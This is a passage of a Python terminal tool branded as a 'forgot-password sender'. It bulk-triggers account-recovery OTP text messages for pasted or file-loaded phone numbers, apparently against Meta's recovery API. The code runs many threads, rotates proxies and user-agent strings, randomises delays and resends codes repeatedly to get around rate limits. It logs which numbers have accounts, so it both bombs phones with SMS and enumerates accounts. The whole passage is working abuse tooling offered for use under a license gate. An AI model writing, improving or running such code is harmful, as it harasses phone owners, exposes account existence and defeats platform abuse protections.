        red = cr.get("redirect_uri") or ""
        err = cr.get("error_message")

        if "/recover/code/" in red or (red and not err):
            mc = re.search(r"ci=([^&]+)", red)
            cci = unquote(mc.group(1)) if mc else cipher
            note = ""
            for i in range(1, max(0, int(cfg["resend"])) + 1):
                time.sleep(random.uniform(2.5, 4.0))
                try:
                    jr = gql("useCAACodeResendMutation", "26721695507419072",
                             {"input": {"actor_id": "0",
                                        "client_mutation_id": str(i + 2),
                                        "access_flow_version": "pre_mt_behavior",
                                        "cipher": cci, "waterfall_id": wf},
                              "scale": 1})
                    ok = ((jr.get("data") or {}).get("caa_ar_code_entry_resend") or {}).get("resend_success")
                    note += ("r%d ok " if ok else "r%d skip ") % i
                except Exception:
                    note += "r%d err " % i
            return "SENT", note.strip()
        if err:
            e = str(err).lower()
            if "too many" in e or "limit" in e:
                return "CAP", err
            return "FAIL", err
        return "FAIL", "send failed"
    except Exception as e:
        return "ERR", "%s: %s" % (type(e).__name__, str(e)[:50])
    finally:
        try:
            s.close()
        except Exception:
            pass

# ─────────────────────────── storage ───────────────────────────
def save_result(num, status, note):
    try:
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write("%s|%s|%s\n" % (num, status, note or ""))
        _chmod600(RESULT_FILE)
    except Exception:
        pass
    if status == "SENT":
        try:
            seen = False
            if os.path.exists(SENT_FILE):
                with open(SENT_FILE, encoding="utf-8", errors="ignore") as f:
                    seen = any(l.strip() == num for l in f)
            if not seen:
                with open(SENT_FILE, "a", encoding="utf-8") as f:
                    f.write(num + "\n")
                _chmod600(SENT_FILE)
        except Exception:
            pass

def load_numbers_file(path):
    out = []
    try:
        with open(path, errors="ignore") as f:
            for l in f:
                d = re.sub(r"\D", "", l)
                if d and ("+" + d) not in out:
                    out.append("+" + d)
    except Exception as e:
        dlog("load %s" % e)
    return out

def load_done():
    try:
        with open(RESULT_FILE, encoding="utf-8", errors="ignore") as f:
            return {l.split("|")[0].strip() for l in f if l.strip()}
    except Exception:
        return set()

# ─────────────────────────── worker ───────────────────────────
TAGS = {"SENT": ("[ OTP SENT ]", OKGOLD), "NOACC": ("[ NO ACCOUNT ]", BRONZE),
        "NOSMS": ("[ NO SMS ]", AMBER), "CAP": ("[ RATE LIMIT ]", AMBER),
        "FAIL": ("[ FAIL ]", BURNT), "ERR": ("[ ERROR ]", BURNT)}

def handle(num, cfg):
    bump("total")
    tries = max(1, int(cfg["retries"]) + 1)
    last = ("ERR", "no attempt")
    for i in range(tries):
        px = next_proxy(cfg)
        fn = engine_web if cfg["engine"] == "web" else engine_mobile
        st, note = fn(num, cfg, px)
        last = (st, note)
        if st in ("SENT", "NOACC", "NOSMS", "CAP"):
            break
        if i + 1 < tries:
            time.sleep(random.uniform(1.2, 2.6))
    st, note = last
    key = st.lower()
    bump(key if key in stats else "err")
    bump("done")
    save_result(num, st, note)
    tag, col = TAGS.get(st, TAGS["ERR"])
    line = "  %s%s%s  %s  %s" % (col, num, R, tag, DIM + note[:44] + R)
    with lock:
        w(line)
    return st

def run_batch(nums, cfg):
    nums = [n for n in dict.fromkeys(nums) if n]
    if not nums:
        w(BURNT + "  no numbers." + R); pause(); return
    stats.update({k: 0 for k in stats})
    clr()
    w(B + GOLD + "  ENGINE STARTED" + R); rule()
    w(GY + "  engine : " + R + BRIGHT + cfg["engine"] + R +
      GY + "   threads: " + R + BRIGHT + str(cfg["threads"]) + R)
    w(GY + "  lang   : " + R + BRIGHT + cfg["lang_mode"] + R +
      GY + "   ip: " + R + BRIGHT + cfg["proxy_mode"] + R)
    w(GY + "  queue  : " + R + GOLD + str(len(nums)) + R)
    rule(); w()

    def job(n):
        time.sleep(random.uniform(0, cfg["delay"]))
        try:
            return handle(n, cfg)
        except Exception as e:
            dlog("job %s" % e)
            return "ERR"

    with ThreadPoolExecutor(max_workers=max(1, int(cfg["threads"]))) as ex:
        list(ex.map(job, nums))

    rule("━", WIDTH + 2, GOLD)
    w(B + "  DONE  " + R + OKGOLD + "%d sent" % stats["sent"] + R + GY + "  " + R +
      BRONZE + "%d noacc" % stats["noacc"] + R + GY + "  " + R +
      AMBER + "%d cap" % stats["cap"] + R + GY + "  " + R +
      BURNT + "%d fail" % (stats["fail"] + stats["err"]) + R)
    rule("━", WIDTH + 2, GOLD)
    w(GY + "  results: " + R + DIM + RESULT_FILE + R)
    w(GY + "  sent   : " + R + DIM + SENT_FILE + R)
    pause()

# ─────────────────────────── ui ───────────────────────────
BANNER = [" ███████╗██╗██╗   ██╗ █████╗ ███╗   ███╗",
          " ██╔════╝██║╚██╗ ██╔╝██╔══██╗████╗ ████║",
          " ███████╗██║ ╚████╔╝ ███████║██╔████╔██║",
          " ╚════██║██║  ╚██╔╝  ██╔══██║██║╚██╔╝██║",
          " ███████║██║   ██║   ██║  ██║██║ ╚═╝ ██║",
          " ╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝"]

def banner():
    global WIDTH
    WIDTH = _tw()
    clr()
    for ln, c in zip(BANNER, [BRIGHT, BRIGHT, GOLD, AMBER, BRONZE, BRONZE]):
        w(B + c + ln + R)
    w()
    w(B + AMBER + "        O T P" + R + GY + "  |  forgot-password sender" + R)
    rule("━", WIDTH + 2, GOLD)
    w(GY + "  engine: " + R + BRIGHT + ("mobile CAA" if HAVE_CFFI else "mobile (requests)") +
      R + GY + " · " + R + OKGOLD + "v1.0" + R)
    rule("━", WIDTH + 2, GOLD)
    w()

def btop(): w(GY + " ┌" + "─" * WIDTH + "┐" + R)
def bsep(): w(GY + " ├" + "─" * WIDTH + "┤" + R)
def bbot(): w(GY + " └" + "─" * WIDTH + "┘" + R)

def menu(cfg):
    banner()
    items = [
        ("1", OKGOLD, "Start (file numbers.txt)"),
        ("2", BRIGHT, "Start (paste numbers)"),
        ("3", GOLD, "Load numbers from path"),
        ("4", GOLD, "Settings"),
        ("5", GOLD, "Language"),
        ("6", GOLD, "IP / proxy"),
        ("7", GOLD, "Diagnose"),
        ("8", GOLD, "Show results"),
        ("0", BURNT, "Exit"),
    ]
    btop()
    w(GY + " │" + R + B + GOLD + " MAIN MENU" + R + " " * (WIDTH - 10) + GY + "│" + R)
    bsep()
    for k, col, label in items:
        line = " [%s]  %s" % (k, label)
        w(GY + " │" + R + col + line + R + " " * max(1, WIDTH - len(line)) + GY + "│" + R)
        if k == "1":
            n = len(load_numbers_file(NUMBER_FILE)) if os.path.exists(NUMBER_FILE) else 0
            line = "      file: %d nums · eng: %s · lang: %s" % (n, cfg["engine"], cfg["lang_mode"])
            w(GY + " │" + R + DIM + line + R + " " * max(1, WIDTH - len(line)) + GY + "│" + R)
    bbot()
    w()
    try:
        return input(AMBER + "  ❯ Choose : " + R).strip().lower()
    except EOFError:
        return "0"

def screen_settings(cfg):
    banner()
    w(B + GOLD + "  SETTINGS" + R); rule()
    w(GY + "  engine  : " + R + BRIGHT + cfg["engine"] + R)
    w(GY + "  lang    : " + R + BRIGHT + cfg["lang_mode"] + R)
    w(GY + "  ip mode : " + R + BRIGHT + cfg["proxy_mode"] + R)
    w(GY + "  threads : " + R + BRIGHT + str(cfg["threads"]) + R)
    w(GY + "  delay   : " + R + BRIGHT + str(cfg["delay"]) + R)
    w(GY + "  timeout : " + R + BRIGHT + str(cfg["timeout"]) + R)
    w(GY + "  resend  : " + R + BRIGHT + str(cfg["resend"]) + R)
    w(GY + "  rotateUA: " + R + BRIGHT + str(cfg["rotate_ua"]) + R)
    w(GY + "  retries : " + R + BRIGHT + str(cfg["retries"]) + R)
    w()
    e = input(GY + "  engine mobile/web [Enter=keep] : " + R).strip().lower()
    if e in ("mobile", "web"):
        cfg["engine"] = e
    t = input(GY + "  threads [Enter=keep] : " + R).strip()
    if t.isdigit():
        cfg["threads"] = max(1, int(t))
    d = input(GY + "  delay sec [Enter=keep] : " + R).strip()
    if d.replace(".", "", 1).isdigit():
        cfg["delay"] = float(d)
    to = input(GY + "  timeout [Enter=keep] : " + R).strip()
    if to.isdigit():
        cfg["timeout"] = max(10, int(to))
    rs = input(GY + "  resend count [Enter=keep] : " + R).strip()
    if rs.isdigit():
        cfg["resend"] = max(0, int(rs))
    ru = input(GY + "  rotate UA on/off [Enter=keep] : " + R).strip().lower()
    if ru in ("on", "off"):
        cfg["rotate_ua"] = ru == "on"
    rt = input(GY + "  retries [Enter=keep] : " + R).strip()
    if rt.isdigit():
        cfg["retries"] = max(0, int(rt))
    save_cfg(cfg)
    w(OKGOLD + "  saved." + R); pause()

def screen_lang(cfg):
    banner()
    w(B + GOLD + "  LANGUAGE" + R); rule()
    w(GY + "  1  auto    (follow number country)" + R)
    w(GY + "  2  rotate  (random per request)" + R)
    w(GY + "  3  fixed   (one header)" + R)
    w()
    w(GY + "  now: " + R + BRIGHT + cfg["lang_mode"] + " " + cfg["lang_fixed"] + R)
    w()
    c = input(AMBER + "  choose [1-3, Enter=keep] : " + R).strip()
    if c == "1":
        cfg["lang_mode"] = "auto"
    elif c == "2":
        cfg["lang_mode"] = "rotate"
    elif c == "3":
        cfg["lang_mode"] = "fixed"
        f = input(GY + "  header e.g. en-US / bn-BD : " + R).strip()
        if f:
            cfg["lang_fixed"] = f
    save_cfg(cfg)
    w(OKGOLD + "  saved." + R); pause()

def screen_ip(cfg):
    banner()
    w(B + GOLD + "  IP / PROXY" + R); rule()
    w(GY + "  1  direct  (no proxy)" + R)
    w(GY + "  2  file    (rotate proxies.txt)" + R)
    w(GY + "  3  single  (one fixed proxy)" + R)
    w(GY + "  4  change proxy country codes" + R)
    w()
    w(GY + "  now  : " + R + BRIGHT + cfg["proxy_mode"] + R)
    w(GY + "  loaded: " + R + BRIGHT + str(len(load_proxies())) + R)
    if cfg["proxy_single"]:
        w(GY + "  single: " + R + DIM + cfg["proxy_single"] + R)
    w()
    c = input(AMBER + "  choose [1-4, Enter=keep] : " + R).strip()
    if c == "1":
        cfg["proxy_mode"] = "direct"
    elif c == "2":
        cfg["proxy_mode"] = "file"
    elif c == "3":
        p = input(GY + "  proxy host:port:user:pass : " + R).strip()
        if p:
            cfg["proxy_single"] = p
            cfg["proxy_mode"] = "single"
    elif c == "4":
        cc = input(GY + "  new 2-letter code (us/bd/gb) : " + R).strip().lower()
        if len(cc) == 2 and cc.isalpha():
            try:
                with open(PROXY_FILE) as f:
                    txt = f.read()
                txt = re.sub(r"_custom_zone_[a-z]{2}_st_", "_custom_zone_%s_st_" % cc, txt)
                txt = re.sub(r"-region-[a-z]{2}:", "-region-%s:" % cc, txt)
                txt = re.sub(r"-country-[a-z]{2}:", "-country-%s:" % cc, txt)
                with open(PROXY_FILE, "w") as f:
                    f.write(txt)
                w(OKGOLD + "  proxies set to " + cc.upper() + R)
            except Exception as e:
                w(BURNT + "  %s" % e + R)
        pause(); return
    save_cfg(cfg)
    w(OKGOLD + "  saved." + R); pause()

def screen_diag(cfg):
    banner()
    w(B + GOLD + "  DIAGNOSE" + R); rule()
    w(GY + "  curl_cffi : " + R + (OKGOLD + "ok" + R if HAVE_CFFI else BURNT + "missing" + R))
    w(GY + "  proxies   : " + R + BRIGHT + str(len(load_proxies())) + R)
    w(GY + "  numbers   : " + R + BRIGHT +
      str(len(load_numbers_file(NUMBER_FILE)) if os.path.exists(NUMBER_FILE) else 0) + R)
    w(GY + "  results   : " + R + BRIGHT +
      (str(sum(1 for _ in open(RESULT_FILE))) if os.path.exists(RESULT_FILE) else "0") + R)
    w()
    num = input(GY + "  test number (+8801...) [Enter=skip] : " + R).strip()
    if num:
        d = re.sub(r"\D", "", num)
        if d:
            num = "+" + d
        w(GY + "  probing with engine " + R + BRIGHT + cfg["engine"] + R)
        px = next_proxy(cfg)
        fn = engine_web if cfg["engine"] == "web" else engine_mobile
        st, note = fn(num, cfg, px)
        col = TAGS.get(st, TAGS["ERR"])[1]
        w("  -> " + col + st + R + "  " + DIM + note + R)
    pause()

def screen_results():
    banner()
    w(B + GOLD + "  RESULTS" + R); rule()
    if not os.path.exists(RESULT_FILE):
        w(GY + "  empty." + R); pause(); return
    cnt = {}
    with open(RESULT_FILE, encoding="utf-8", errors="ignore") as f:
        for l in f:
            if "|" in l:
                s = l.split("|")[1]
                cnt[s] = cnt.get(s, 0) + 1
    for k, v in sorted(cnt.items(), key=lambda x: -x[1]):
        col = TAGS.get(k, TAGS["ERR"])[1]
        w("  " + col + k + R + GY + " : " + R + BRIGHT + str(v) + R)
    w(); w(GY + "  file: " + R + DIM + RESULT_FILE + R)
    pause()

def screen_paste(cfg):
    banner()
    w(B + GOLD + "  PASTE NUMBERS" + R); rule()
    w(GY + "  one per line, empty line = start" + R); w()
    nums = []
    while True:
        try:
            raw = input(BRIGHT + "  #%d : " % (len(nums) + 1) + R).strip()
        except EOFError:
            break
        if not raw:
            if nums:
                break
            continue
        d = re.sub(r"\D", "", raw)
        if d:
            nums.append("+" + d)
    run_batch(nums, cfg)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-n", "--numbers")
    ap.add_argument("-e", "--engine", choices=["mobile", "web"])
    ap.add_argument("-t", "--threads", type=int)
    ap.add_argument("-l", "--lang", choices=["auto", "rotate", "fixed"])
    ap.add_argument("-x", "--proxy", choices=["direct", "file", "single"])
    ap.add_argument("-r", "--resume", action="store_true")
    a = ap.parse_args()

    cfg = load_cfg()
    if a.engine:
        cfg["engine"] = a.engine
    if a.threads:
        cfg["threads"] = max(1, a.threads)
    if a.lang:
        cfg["lang_mode"] = a.lang
    if a.proxy:
        cfg["proxy_mode"] = a.proxy
    if any([a.engine, a.threads, a.lang, a.proxy]):
        save_cfg(cfg)

    global proxy_list
    proxy_list = load_proxies()

    if a.numbers:
        nums = load_numbers_file(a.numbers)
        if a.resume:
            done = load_done()
            nums = [n for n in nums if n not in done]
        run_batch(nums, cfg)
        return

    while True:
        ch = menu(cfg)
        if ch == "1":
            nums = load_numbers_file(NUMBER_FILE) if os.path.exists(NUMBER_FILE) else []
            run_batch(nums, cfg)
        elif ch == "2":
            screen_paste(cfg)
        elif ch == "3":
            banner()
            p = input(GY + "  path : " + R).strip().strip("'\"")
            if p and os.path.exists(p):
                run_batch(load_numbers_file(p), cfg)
            else:
                w(BURNT + "  not found." + R); pause()
        elif ch == "4":
            screen_settings(cfg)
        elif ch == "5":
            screen_lang(cfg)
        elif ch == "6":
            proxy_list = load_proxies()
            screen_ip(cfg)
            proxy_list = load_proxies()
        elif ch == "7":
            screen_diag(cfg)
        elif ch == "8":
            screen_results()
        elif ch == "0":
            clr(); w(GOLD + "\n  bye\n" + R); sys.exit(0)

if __name__ == "__main__":
    try:
        license_gate()
        main()
    except KeyboardInterrupt:
        w(BURNT + "\n\n  stopped.\n" + R)
        sys.exit(0)
